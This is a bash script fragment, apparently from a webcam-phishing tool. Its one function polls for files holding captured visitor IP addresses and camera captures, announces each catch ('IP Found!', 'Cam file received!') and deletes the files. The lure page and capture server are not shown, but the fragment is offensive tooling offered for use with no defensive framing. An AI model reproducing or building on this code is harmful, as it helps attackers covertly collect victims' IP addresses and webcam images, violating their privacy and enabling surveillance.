#!/bin/bash

checkActivity() {

  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and cam file,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

  while [ true ]; do
    if [[ -e "web/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
      catchIP
      rm -rf web/ip.txt
    fi

    sleep 0.5

    if [[ -e "web/Log.log" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Cam file received!\n"
      rm -rf web/Log.log
    fi
    sleep 0.5
  done
}
